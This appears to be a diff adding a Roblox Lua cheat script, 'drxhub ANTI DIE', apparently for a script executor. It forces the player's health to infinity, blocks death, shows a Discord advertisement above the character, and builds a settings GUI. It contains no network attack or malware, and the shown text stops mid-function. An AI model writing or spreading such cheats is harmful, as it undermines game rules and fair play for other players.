@@ -1,0 +1,861 @@
+if _G.drxhubAntiDieRunning then return end
+_G.drxhubAntiDieRunning = true
+
+repeat task.wait() until game:IsLoaded()
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local SoundService = game:GetService("SoundService")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+
+-- ============================================================
+-- CONFIG
+-- ============================================================
+local GUI_NAME = "drxhub"
+local UI_BACKGROUND_ID = "84126854130474"
+local CONFIG_FILE = "drxhubAntiDie.json"
+
+-- SMOKE IT OFF AUDIO ID
+local SMOKE_IT_OFF_ID = "rbxassetid://101828065022988"
+
+-- BILLBOARD TEXT
+local BILLBOARD_TITLE = "drxhub"
+local BILLBOARD_SUB   = "drxhub"
+local BILLBOARD_LINK  = "https://discord.gg/pZhus3uv7S"
+
+-- RADIOACTIVE GREEN THEME
+local RADIO_GREEN = Color3.fromRGB(57, 255, 20)
+local BLACK_BG = Color3.fromRGB(0, 0, 0)
+local BLACK_BG2 = Color3.fromRGB(15, 15, 15)
+local ROW_BORDER = Color3.fromRGB(30, 30, 30)
+local WHITE = Color3.fromRGB(255, 255, 255)
+local GRAY = Color3.fromRGB(140, 140, 140)
+
+local CORNER_RADIUS = UDim.new(0, 12)
+local TOGGLE_CORNER_RADIUS = UDim.new(1, 0)
+
+local Config = {
+    Enabled = false,
+    Keybind = Enum.KeyCode.RightShift,
+    SmokeItOff = false,
+    IsMobileMode = false,
+    MobileUIScale = 100,
+}
+
+-- ============================================================
+-- SAVE / LOAD
+-- ============================================================
+local function saveConfig()
+    local data = {
+        Enabled = Config.Enabled,
+        Keybind = Config.Keybind and Config.Keybind.Name or "RightShift",
+        SmokeItOff = Config.SmokeItOff,
+        IsMobileMode = Config.IsMobileMode,
+        MobileUIScale = Config.MobileUIScale,
+    }
+    pcall(function()
+        writefile(CONFIG_FILE, HttpService:JSONEncode(data))
+    end)
+end
+
+local function loadConfig()
+    if not isfile or not isfile(CONFIG_FILE) then return end
+    local ok, data = pcall(function()
+        return HttpService:JSONDecode(readfile(CONFIG_FILE))
+    end)
+    if not ok or not data then return end
+
+    if data.Enabled ~= nil then Config.Enabled = data.Enabled end
+    if data.Keybind and Enum.KeyCode[data.Keybind] then
+        Config.Keybind = Enum.KeyCode[data.Keybind]
+    end
+    if data.SmokeItOff ~= nil then Config.SmokeItOff = data.SmokeItOff end
+    if data.IsMobileMode ~= nil then Config.IsMobileMode = data.IsMobileMode end
+    if data.MobileUIScale then
+        Config.MobileUIScale = math.clamp(tonumber(data.MobileUIScale) or 100, 50, 150)
+    end
+end
+
+loadConfig()
+
+-- ============================================================
+-- SOUND MODULE (SMOKE IT OFF)
+-- ============================================================
+local SmokeItOff = { sound = nil, isPlaying = false }
+function SmokeItOff:ensureSound()
+    if not self.sound or not self.sound.Parent then
+        self.sound = Instance.new("Sound")
+        self.sound.Name = "RadiantSmokeItOff"
+        self.sound.SoundId = SMOKE_IT_OFF_ID
+        self.sound.Looped = true
+        self.sound.Volume = 0.5
+        self.sound.Parent = SoundService
+    end
+    return self.sound
+end
+function SmokeItOff:play()
+    if not Config.SmokeItOff then return end
+    local s = self:ensureSound()
+    if not s.IsPlaying then s:Play(); self.isPlaying = true end
+end
+function SmokeItOff:stop()
+    if self.sound and self.sound.IsPlaying then self.sound:Stop() end
+    self.isPlaying = false
+end
+
+-- ============================================================
+-- BILLBOARD ABOVE HEAD (drxhub / drxhub / discord)
+-- ============================================================
+local function createBillboard()
+    local character = LocalPlayer.Character
+    if not character then return end
+    local head = character:FindFirstChild("Head") or character:FindFirstChild("UpperTorso")
+    if not head then return end
+
+    -- Remove existing
+    local existing = head:FindFirstChild("drxhub_Billboard")
+    if existing then existing:Destroy() end
+
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "drxhub_Billboard"
+    billboard.Adornee = head
+    billboard.Parent = head
+    billboard.Size = UDim2.new(0, 260, 0, 60)
+    billboard.StudsOffset = Vector3.new(0, 3.6, 0)
+    billboard.MaxDistance = 250
+    billboard.AlwaysOnTop = true
+
+    -- Row 1: drxhub (big, radioactive green)
+    local title = Instance.new("TextLabel")
+    title.Parent = billboard
+    title.BackgroundTransparency = 1
+    title.Position = UDim2.new(0, 0, 0, 0)
+    title.Size = UDim2.new(1, 0, 0.4, 0)
+    title.Font = Enum.Font.GothamBlack
+    title.Text = BILLBOARD_TITLE
+    title.TextColor3 = RADIO_GREEN
+    title.TextScaled = true
+    title.TextXAlignment = Enum.TextXAlignment.Center
+    title.TextYAlignment = Enum.TextYAlignment.Center
+    title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    title.TextStrokeTransparency = 0.2
+
+    -- Row 2: drxhub (medium, radioactive green)
+    local subtitle = Instance.new("TextLabel")
+    subtitle.Parent = billboard
+    subtitle.BackgroundTransparency = 1
+    subtitle.Position = UDim2.new(0, 0, 0.4, 0)
+    subtitle.Size = UDim2.new(1, 0, 0.3, 0)
+    subtitle.Font = Enum.Font.GothamBlack
+    subtitle.Text = BILLBOARD_SUB
+    subtitle.TextColor3 = RADIO_GREEN
+    subtitle.TextScaled = true
+    subtitle.TextXAlignment = Enum.TextXAlignment.Center
+    subtitle.TextYAlignment = Enum.TextYAlignment.Center
+    subtitle.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    subtitle.TextStrokeTransparency = 0.2
+
+    -- Row 3: Discord invite (small, radioactive green)
+    local link = Instance.new("TextLabel")
+    link.Parent = billboard
+    link.BackgroundTransparency = 1
+    link.Position = UDim2.new(0, 0, 0.7, 0)
+    link.Size = UDim2.new(1, 0, 0.3, 0)
+    link.Font = Enum.Font.GothamBold
+    link.Text = BILLBOARD_LINK
+    link.TextColor3 = RADIO_GREEN
+    link.TextScaled = true
+    link.TextXAlignment = Enum.TextXAlignment.Center
+    link.TextYAlignment = Enum.TextYAlignment.Center
+    link.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    link.TextStrokeTransparency = 0.3
+end
+
+createBillboard()
+LocalPlayer.CharacterAdded:Connect(function()
+    task.wait(0.5)
+    createBillboard()
+end)
+
+-- ============================================================
+-- CLEANUP / HELPERS
+-- ============================================================
+local function cleanupGui()
+    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+    local existing = playerGui:FindFirstChild(GUI_NAME)
+    if existing then existing:Destroy() end
+end
+
+local function addCorner(instance, radius)
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = radius
+    corner.Parent = instance
+end
+
+local function addStroke(instance, color, thickness)
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = color
+    stroke.Thickness = thickness
+    stroke.Parent = instance
+end
+
+local function makeDraggable(frame)
+    local dragging, dragStart, startPos = false, nil, nil
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = frame.Position
+        end
+    end)
+    frame.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = false
+        end
+    end)
+    frame.InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+end
+
+-- ============================================================
+-- ANTI DIE LOGIC
+-- ============================================================
+local heartConn, charAddedConn = nil, nil
+local deathConns = {}
+
+local function protectChar(char)
+    if not char then return end
+    local hum = char:WaitForChild("Humanoid", 5)
+    if not hum then return end
+
+    hum.MaxHealth = math.huge
+    hum.Health = math.huge
+
+    local sc = hum.StateChanged:Connect(function(_, new)
+        if not Config.Enabled then return end
+        if new == Enum.HumanoidStateType.Dead then
+            hum.Health = math.huge
+            hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
+        end
+    end)
+    table.insert(deathConns, sc)
+
+    hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
+
+    local hc = hum:GetPropertyChangedSignal("Health"):Connect(function()
+        if not Config.Enabled then return end
+        if hum.Health < hum.MaxHealth then hum.Health = math.huge end
+    end)
+    table.insert(deathConns, hc)
+
+    if heartConn then heartConn:Disconnect() end
+    heartConn = RunService.Heartbeat:Connect(function()
+        if not Config.Enabled then return end
+        if hum and hum.Parent and hum.Health < hum.MaxHealth then hum.Health = math.huge end
+    end)
+end
+
+local function startProtect()
+    for _, c in ipairs(deathConns) do pcall(function() c:Disconnect() end) end
+    deathConns = {}
+    if heartConn then heartConn:Disconnect(); heartConn = nil end
+    if charAddedConn then charAddedConn:Disconnect(); charAddedConn = nil end
+
+    protectChar(LocalPlayer.Character)
+    charAddedConn = LocalPlayer.CharacterAdded:Connect(function(c)
+        if not Config.Enabled then return end
+        task.wait(0.1)
+        for _, c2 in ipairs(deathConns) do pcall(function() c2:Disconnect() end) end
+        deathConns = {}
+        protectChar(c)
+    end)
+end
+
+local function stopProtect()
+    for _, c in ipairs(deathConns) do pcall(function() c:Disconnect() end) end
+    deathConns = {}
+    if heartConn then heartConn:Disconnect(); heartConn = nil end
+    if charAddedConn then charAddedConn:Disconnect(); charAddedConn = nil end
+
+    local char = LocalPlayer.Character
+    if char then
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if hum then
+            hum:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
+            hum.MaxHealth = 100
+            hum.Health = 100
+        end
+    end
+end
+
+-- ============================================================
+-- UI CREATION
+-- ============================================================
+local function buildGui()
+    cleanupGui()
+    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+    local mainGui = Instance.new("ScreenGui")
+    mainGui.Name = GUI_NAME
+    mainGui.IgnoreGuiInset = true
+    mainGui.ResetOnSpawn = false
+    mainGui.DisplayOrder = 999
+    mainGui.Parent = playerGui
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "Main"
+    mainFrame.Active = true
+    mainFrame.ClipsDescendants = true
+    mainFrame.Position = UDim2.new(0.5, -150, 0.5, -150)
+    mainFrame.Size = UDim2.new(0, 300, 0, 300)
+    mainFrame.BackgroundColor3 = BLACK_BG
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Parent = mainGui
+    addCorner(mainFrame, CORNER_RADIUS)
+
+    -- Background image (visible layer)
+    local backgroundImage = Instance.new("ImageLabel")
+    backgroundImage.Name = "BackgroundImage"
+    backgroundImage.ZIndex = 1
+    backgroundImage.Size = UDim2.new(1, 0, 1, 0)
+    backgroundImage.Position = UDim2.new(0, 0, 0, 0)
+    backgroundImage.BackgroundTransparency = 1
+    backgroundImage.Image = "rbxassetid://" .. UI_BACKGROUND_ID
+    backgroundImage.ImageTransparency = 0.15
+    backgroundImage.ScaleType = Enum.ScaleType.Crop
+    backgroundImage.Parent = mainFrame
+    addCorner(backgroundImage, CORNER_RADIUS)
+
+    -- Dark tint overlay (light so image shows)
+    local tint = Instance.new("Frame")
+    tint.Name = "Tint"
+    tint.ZIndex = 2
+    tint.Size = UDim2.new(1, 0, 1, 0)
+    tint.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    tint.BackgroundTransparency = 0.45
+    tint.BorderSizePixel = 0
+    tint.Parent = mainFrame
+    addCorner(tint, CORNER_RADIUS)
+
+    local mobileScale = Instance.new("UIScale")
+    mobileScale.Name = "MobileScale"
+    mobileScale.Scale = 1
+    mobileScale.Parent = mainFrame
+
+    -- ===== TITLE =====
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Name = "TitleLabel"
+    titleLabel.ZIndex = 5
+    titleLabel.Position = UDim2.new(0, 18, 0, 12)
+    titleLabel.Size = UDim2.new(0, 170, 0, 30)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = "drxhub"
+    titleLabel.TextColor3 = RADIO_GREEN
+    titleLabel.TextSize = 20
+    titleLabel.Font = Enum.Font.GothamBlack
+    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    titleLabel.TextStrokeTransparency = 0.5
+    titleLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    titleLabel.Parent = mainFrame
+
+    local subtitleLabel = Instance.new("TextLabel")
+    subtitleLabel.Name = "SubtitleLabel"
+    subtitleLabel.ZIndex = 5
+    subtitleLabel.Position = UDim2.new(0, 18, 0, 38)
+    subtitleLabel.Size = UDim2.new(0, 170, 0, 16)
+    subtitleLabel.BackgroundTransparency = 1
+    subtitleLabel.Text = "ANTI DIE"
+    subtitleLabel.TextColor3 = Color3.fromRGB(220, 255, 220)
+    subtitleLabel.TextSize = 11
+    subtitleLabel.Font = Enum.Font.GothamBold
+    subtitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    subtitleLabel.TextStrokeTransparency = 0.5
+    subtitleLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    subtitleLabel.Parent = mainFrame
+
+    -- ===== PC / MOBILE SELECTOR =====
+    local modeContainer = Instance.new("Frame")
+    modeContainer.Name = "ModeContainer"
+    modeContainer.ZIndex = 5
+    modeContainer.Position = UDim2.new(1, -130, 0, 14)
+    modeContainer.Size = UDim2.new(0, 112, 0, 34)
+    modeContainer.BackgroundColor3 = Color3.fromRGB(15, 30, 15)
+    modeContainer.BackgroundTransparency = 0.3
+    modeContainer.BorderSizePixel = 0
+    modeContainer.Parent = mainFrame
+    addCorner(modeContainer, UDim.new(0, 8))
+    addStroke(modeContainer, ROW_BORDER, 1)
+
+    local pcBtn = Instance.new("TextButton")
+    pcBtn.Name = "PCBtn"
+    pcBtn.ZIndex = 6
+    pcBtn.Position = UDim2.new(0, 3, 0, 3)
+    pcBtn.Size = UDim2.new(0, 50, 0, 28)
+    pcBtn.BackgroundColor3 = RADIO_GREEN
+    pcBtn.Text = "PC"
+    pcBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
+    pcBtn.TextSize = 13
+    pcBtn.Font = Enum.Font.GothamBold
+    pcBtn.AutoButtonColor = false
+    pcBtn.Parent = modeContainer
+    addCorner(pcBtn, UDim.new(0, 6))
+
+    local mobileBtn = Instance.new("TextButton")
+    mobileBtn.Name = "MobileBtn"
+    mobileBtn.ZIndex = 6
+    mobileBtn.Position = UDim2.new(0, 57, 0, 3)
+    mobileBtn.Size = UDim2.new(0, 52, 0, 28)
+    mobileBtn.BackgroundColor3 = Color3.fromRGB(30, 50, 30)
+    mobileBtn.Text = "MOBILE"
+    mobileBtn.TextColor3 = Color3.fromRGB(150, 200, 150)
+    mobileBtn.TextSize = 10
+    mobileBtn.Font = Enum.Font.GothamBold
+    mobileBtn.AutoButtonColor = false
+    mobileBtn.Parent = modeContainer
+    addCorner(mobileBtn, UDim.new(0, 6))
+
+    -- ===== HOTKEY ROW =====
+    local hotkeyContainer = Instance.new("Frame")
+    hotkeyContainer.Name = "HotkeyContainer"
+    hotkeyContainer.ZIndex = 4
+    hotkeyContainer.Position = UDim2.new(0, 18, 0, 70)
+    hotkeyContainer.Size = UDim2.new(1, -36, 0, 46)
+    hotkeyContainer.BackgroundColor3 = BLACK_BG2
+    hotkeyContainer.BackgroundTransparency = 0.4
+    hotkeyContainer.Parent = mainFrame
+    addCorner(hotkeyContainer, UDim.new(0, 10))
+    addStroke(hotkeyContainer, ROW_BORDER, 1)
+
+    local hotkeyLabel = Instance.new("TextLabel")
+    hotkeyLabel.Name = "HotkeyLabel"
+    hotkeyLabel.ZIndex = 6
+    hotkeyLabel.Position = UDim2.new(0, 14, 0, 0)
+    hotkeyLabel.Size = UDim2.new(0, 100, 1, 0)
+    hotkeyLabel.BackgroundTransparency = 1
+    hotkeyLabel.Text = "HOTKEY"
+    hotkeyLabel.TextColor3 = WHITE
+    hotkeyLabel.TextSize = 13
+    hotkeyLabel.Font = Enum.Font.GothamBold
+    hotkeyLabel.TextXAlignment = Enum.TextXAlignment.Left
+    hotkeyLabel.Parent = hotkeyContainer
+
+    local keybindBtn = Instance.new("TextButton")
+    keybindBtn.Name = "KeybindBtn"
+    keybindBtn.ZIndex = 6
+    keybindBtn.Position = UDim2.new(1, -90, 0.5, -13)
+    keybindBtn.Size = UDim2.new(0, 76, 0, 26)
+    keybindBtn.BackgroundColor3 = Color3.fromRGB(30, 50, 30)
+    keybindBtn.Text = Config.Keybind.Name
+    keybindBtn.TextColor3 = RADIO_GREEN
+    keybindBtn.TextSize = 12
+    keybindBtn.Font = Enum.Font.GothamBold
+    keybindBtn.AutoButtonColor = false
+    keybindBtn.Parent = hotkeyContainer
+    addCorner(keybindBtn, UDim.new(0, 8))
+    addStroke(keybindBtn, ROW_BORDER, 1)
+
+    -- ===== MOBILE UI SIZE ROW =====
+    local sizeContainer = Instance.new("Frame")
+    sizeContainer.Name = "SizeContainer"
+    sizeContainer.ZIndex = 4
+    sizeContainer.Position = UDim2.new(0, 18, 0, 70)
+    sizeContainer.Size = UDim2.new(1, -36, 0, 46)
+    sizeContainer.BackgroundColor3 = BLACK_BG2
+    sizeContainer.BackgroundTransparency = 0.4
+    sizeContainer.Visible = false
+    sizeContainer.Parent = mainFrame
+    addCorner(sizeContainer, UDim.new(0, 10))
+    addStroke(sizeContainer, ROW_BORDER, 1)
+
+    local sizeLabel = Instance.new("TextLabel")
+    sizeLabel.Name = "SizeLabel"
+    sizeLabel.ZIndex = 6
+    sizeLabel.Position = UDim2.new(0, 14, 0, 0)
+    sizeLabel.Size = UDim2.new(0, 100, 1, 0)
+    sizeLabel.BackgroundTransparency = 1
+    sizeLabel.Text = "UI SIZE"
+    sizeLabel.TextColor3 = WHITE
+    sizeLabel.TextSize = 13
+    sizeLabel.Font = Enum.Font.GothamBold
+    sizeLabel.TextXAlignment = Enum.TextXAlignment.Left
+    sizeLabel.Parent = sizeContainer
+
+    local sliderTrack = Instance.new("Frame")
+    sliderTrack.Name = "SliderTrack"
+    sliderTrack.ZIndex = 6
+    sliderTrack.Position = UDim2.new(1, -160, 0.5, -2)
+    sliderTrack.Size = UDim2.new(0, 100, 0, 4)
+    sliderTrack.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    sliderTrack.BorderSizePixel = 0
+    sliderTrack.Parent = sizeContainer
+    addCorner(sliderTrack, UDim.new(1, 0))
+
+    local sliderFill = Instance.new("Frame")
+    sliderFill.Name = "SliderFill"
+    sliderFill.ZIndex = 7
+    sliderFill.Size = UDim2.new(0.5, 0, 1, 0)
+    sliderFill.BackgroundColor3 = RADIO_GREEN
+    sliderFill.BorderSizePixel = 0
+    sliderFill.Parent = sliderTrack
+    addCorner(sliderFill, UDim.new(1, 0))
+
+    local sliderKnob = Instance.new("Frame")
+    sliderKnob.Name = "SliderKnob"
+    sliderKnob.ZIndex = 8
+    sliderKnob.Size = UDim2.new(0, 14, 0, 14)
+    sliderKnob.AnchorPoint = Vector2.new(0.5, 0.5)
+    sliderKnob.Position = UDim2.new(0.5, 0, 0.5, 0)
+    sliderKnob.BackgroundColor3 = RADIO_GREEN
+    sliderKnob.BorderSizePixel = 0
+    sliderKnob.Parent = sliderTrack
+    addCorner(sliderKnob, UDim.new(1, 0))
+    local knobStroke = Instance.new("UIStroke")
+    knobStroke.Color = Color3.fromRGB(0, 0, 0)
+    knobStroke.Thickness = 1.5
+    knobStroke.Parent = sliderKnob
+
+    local sizeValueLabel = Instance.new("TextLabel")
+    sizeValueLabel.Name = "SizeValueLabel"
+    sizeValueLabel.ZIndex = 6
+    sizeValueLabel.Position = UDim2.new(1, -48, 0.5, -10)
+    sizeValueLabel.Size = UDim2.new(0, 40, 0, 20)
+    sizeValueLabel.BackgroundTransparency = 1
+    sizeValueLabel.Text = tostring(Config.MobileUIScale) .. "%"
+    sizeValueLabel.TextColor3 = RADIO_GREEN
+    sizeValueLabel.TextSize = 11
+    sizeValueLabel.Font = Enum.Font.GothamBold
+    sizeValueLabel.TextXAlignment = Enum.TextXAlignment.Right
+    sizeValueLabel.Parent = sizeContainer
+
+    local sliderHit = Instance.new("TextButton")
+    sliderHit.Name = "SliderHit"
+    sliderHit.ZIndex = 9
+    sliderHit.Position = UDim2.new(1, -170, 0.5, -14)
+    sliderHit.Size = UDim2.new(0, 120, 0, 28)
+    sliderHit.BackgroundTransparency = 1
+    sliderHit.Text = ""
+    sliderHit.AutoButtonColor = false
+    sliderHit.Parent = sizeContainer
+
+    local MIN_SCALE = 50
+    local MAX_SCALE = 150
+    local isSliding = false
+
+    local function applyMobileScale(percent)
+        percent = math.clamp(percent, MIN_SCALE, MAX_SCALE)
+        Config.MobileUIScale = percent
+        mobileScale.Scale = percent / 100
+        local alpha = (percent - MIN_SCALE) / (MAX_SCALE - MIN_SCALE)
+        sliderFill.Size = UDim2.new(alpha, 0, 1, 0)
+        sliderKnob.Position = UDim2.new(alpha, 0, 0.5, 0)
+        sizeValueLabel.Text = tostring(percent) .. "%"
+        saveConfig()
+    end
+
+    local function updateSliderFromX(px)
+        local left = sliderTrack.AbsolutePosition.X
+        local width = sliderTrack.AbsoluteSize.X
+        if width <= 0 then return end
+        local alpha = math.clamp((px - left) / width, 0, 1)
+        local percent = math.floor(MIN_SCALE + (MAX_SCALE - MIN_SCALE) * alpha + 0.5)
+        applyMobileScale(percent)
+    end
+
+    sliderHit.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            isSliding = true
+            updateSliderFromX(input.Position.X)
+        end
+    end)
+    sliderHit.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            isSliding = false
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if not isSliding then return end
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            updateSliderFromX(input.Position.X)
+        end
+    end)
+    UserInputService.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            isSliding = false
+        end
+    end)
+
+    applyMobileScale(Config.MobileUIScale)
+
+    -- ===== SMOKE IT OFF ROW =====
+    local smokeContainer = Instance.new("Frame")
+    smokeContainer.Name = "SmokeContainer"
+    smokeContainer.ZIndex = 4
+    smokeContainer.Position = UDim2.new(0, 18, 0, 126)
+    smokeContainer.Size = UDim2.new(1, -36, 0, 44)
+    smokeContainer.BackgroundColor3 = BLACK_BG2
+    smokeContainer.BackgroundTransparency = 0.4
+    smokeContainer.Parent = mainFrame
+    addCorner(smokeContainer, UDim.new(0, 10))
+    addStroke(smokeContainer, ROW_BORDER, 1)
+
+    local smokeLabel = Instance.new("TextLabel")
+    smokeLabel.Name = "SmokeLabel"
+    smokeLabel.ZIndex = 6
+    smokeLabel.Position = UDim2.new(0, 14, 0, 0)
+    smokeLabel.Size = UDim2.new(0, 150, 1, 0)
+    smokeLabel.BackgroundTransparency = 1
+    smokeLabel.Text = "SMOKE IT OFF"
+    smokeLabel.TextColor3 = WHITE
+    smokeLabel.TextSize = 13
+    smokeLabel.Font = Enum.Font.GothamBold
+    smokeLabel.TextXAlignment = Enum.TextXAlignment.Left
+    smokeLabel.Parent = smokeContainer
+
+    local smokeToggleBg = Instance.new("Frame")
+    smokeToggleBg.Name = "ToggleBg"
+    smokeToggleBg.ZIndex = 6
+    smokeToggleBg.Position = UDim2.new(1, -62, 0.5, -11)
+    smokeToggleBg.Size = UDim2.new(0, 48, 0, 22)
+    smokeToggleBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    smokeToggleBg.BorderSizePixel = 0
+    smokeToggleBg.Parent = smokeContainer
+    addCorner(smokeToggleBg, TOGGLE_CORNER_RADIUS)
+    addStroke(smokeToggleBg, ROW_BORDER, 1)
+
+    local smokeIndicator = Instance.new("Frame")
+    smokeIndicator.Name = "Indicator"
+    smokeIndicator.ZIndex = 7
+    smokeIndicator.Position = UDim2.new(0, 3, 0.5, -8)
+    smokeIndicator.Size = UDim2.new(0, 16, 0, 16)
+    smokeIndicator.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
+    smokeIndicator.BorderSizePixel = 0
+    smokeIndicator.Parent = smokeToggleBg
+    addCorner(smokeIndicator, TOGGLE_CORNER_RADIUS)
+
+    local smokeButton = Instance.new("TextButton")
+    smokeButton.Name = "SmokeButton"
+    smokeButton.ZIndex = 6
+    smokeButton.Size = UDim2.new(1, 0, 1, 0)
+    smokeButton.BackgroundTransparency = 1
+    smokeButton.Text = ""
+    smokeButton.AutoButtonColor = false
+    smokeButton.Parent = smokeContainer
+
+    -- ===== BIG STATUS BUTTON =====
+    local statusButton = Instance.new("TextButton")
+    statusButton.Name = "StatusButton"
+    statusButton.ZIndex = 5
+    statusButton.AnchorPoint = Vector2.new(0, 1)
+    statusButton.Position = UDim2.new(0, 18, 1, -14)
+    statusButton.Size = UDim2.new(1, -36, 0, 54)
+    statusButton.BackgroundColor3 = Color3.fromRGB(15, 30, 15)
+    statusButton.BackgroundTransparency = 0.15
+    statusButton.Text = "DISABLED"
+    statusButton.TextColor3 = GRAY
+    statusButton.TextSize = 22
+    statusButton.Font = Enum.Font.GothamBlack
+    statusButton.AutoButtonColor = false
+    statusButton.Parent = mainFrame
+    addCorner(statusButton, UDim.new(0, 14))
+    addStroke(statusButton, ROW_BORDER, 1.5)
+
+    -- ============================================================
+    -- KEYBIND LOGIC
+    -- ============================================================
+    local isBinding = false
+
+    local function startBinding()
+        isBinding = true
+        keybindBtn.Text = "..."
+        keybindBtn.BackgroundColor3 = Color3.fromRGB(50, 80, 50)
+
+        local connection
+        connection = UserInputService.InputBegan:Connect(function(input, gpe)
+            if gpe then return end
+            if input.UserInputType == Enum.UserInputType.Keyboard then
+                Config.Keybind = input.KeyCode
+                isBinding = false
+                keybindBtn.Text = Config.Keybind.Name
+                keybindBtn.BackgroundColor3 = Color3.fromRGB(30, 50, 30)
+                saveConfig()
+                connection:Disconnect()
+            elseif input.UserInputType == Enum.UserInputType.Gamepad1 then
+                Config.Keybind = input.KeyCode
+                isBinding = false
+                keybindBtn.Text = Config.Keybind.Name
+                keybindBtn.BackgroundColor3 = Color3.fromRGB(30, 50, 30)
+                saveConfig()
+                connection:Disconnect()
+            end
+        end)
+    end
+
+    keybindBtn.MouseButton1Click:Connect(function()
+        if not isBinding then startBinding() end
+    end)
+
+    -- ============================================================
+    -- TOGGLE LOGIC (Anti Die)
+    -- ============================================================
+    local function updateToggle(state)
+        Config.Enabled = state
+        if state then
+            TweenService:Create(statusButton, TweenInfo.new(0.15), {
+                BackgroundColor3 = RADIO_GREEN,
+                TextColor3 = Color3.fromRGB(0, 0, 0)
+            }):Play()
+            if Config.IsMobileMode then
+                statusButton.Text = "ACTIVE"
+            else
+                statusButton.Text = "ENABLED"
+            end
+            startProtect()
+            if Config.SmokeItOff then SmokeItOff:play() end
+        else
+            TweenService:Create(statusButton, TweenInfo.new(0.15), {
+                BackgroundColor3 = Color3.fromRGB(15, 30, 15),
+                TextColor3 = GRAY
+            }):Play()
+            if Config.IsMobileMode then
+                statusButton.Text = "ACTIVATE"
+            else
+                statusButton.Text = "DISABLED"
+            end
+            stopProtect()
+            SmokeItOff:stop()
+        end
+        saveConfig()
+    end
+
+    statusButton.MouseButton1Click:Connect(function()
+        updateToggle(not Config.Enabled)
+    end)
+
+    UserInputService.InputBegan:Connect(function(input, gpe)
+        if gpe then return end
+        if input.KeyCode == Config.Keybind then
+            updateToggle(not Config.Enabled)
+        end
+    end)
+
+    -- ============================================================
+    -- SMOKE IT OFF TOGGLE
+    -- ============================================================
+    local smokeOn = Config.SmokeItOff
+    local function updateSmoke(state)
+        smokeOn = state
+        Config.SmokeItOff = state
+        if state then
+            TweenService:Create(smokeToggleBg, TweenInfo.new(0.15), { BackgroundColor3 = RADIO_GREEN }):Play()
+            TweenService:Create(smokeIndicator, TweenInfo.new(0.15), {
+                Position = UDim2.new(1, -19, 0.5, -8),
+                BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+            }):Play()
+            if Config.Enabled then SmokeItOff:play() end
+        else
+            TweenService:Create(smokeToggleBg, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(40, 40, 40) }):Play()
+            TweenService:Create(smokeIndicator, TweenInfo.new(0.15), {
+                Position = UDim2.new(0, 3, 0.5, -8),
+                BackgroundColor3 = Color3.fromRGB(200, 200, 200)
+            }):Play()
+            SmokeItOff:stop()
+        end
+        saveConfig()
+    end
+
+    if Config.SmokeItOff then
+        smokeToggleBg.BackgroundColor3 = RADIO_GREEN
+        smokeIndicator.Position = UDim2.new(1, -19, 0.5, -8)
+        smokeIndicator.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    end
+
+    smokeButton.MouseButton1Click:Connect(function()
+        updateSmoke(not smokeOn)
+    end)
+
+    -- ============================================================
+    -- PC / MOBILE MODE SWITCH
+    -- ============================================================
+    local function setMobileMode(isMobile)
+        Config.IsMobileMode = isMobile
+        if isMobile then
+            hotkeyContainer.Visible = false
+            sizeContainer.Visible = true
+            mainFrame.Size = UDim2.new(0, 280, 0, 240)
+            sizeContainer.Position = UDim2.new(0, 18, 0, 70)
+            smokeContainer.Position = UDim2.new(0, 18, 0, 122)
+            statusButton.Text = Config.Enabled and "ACTIVE" or "ACTIVATE"
+            pcBtn.BackgroundColor3 = Color3.fromRGB(30, 50, 30)
+            pcBtn.TextColor3 = Color3.fromRGB(150, 200, 150)
+            mobileBtn.BackgroundColor3 = RADIO_GREEN
+            mobileBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
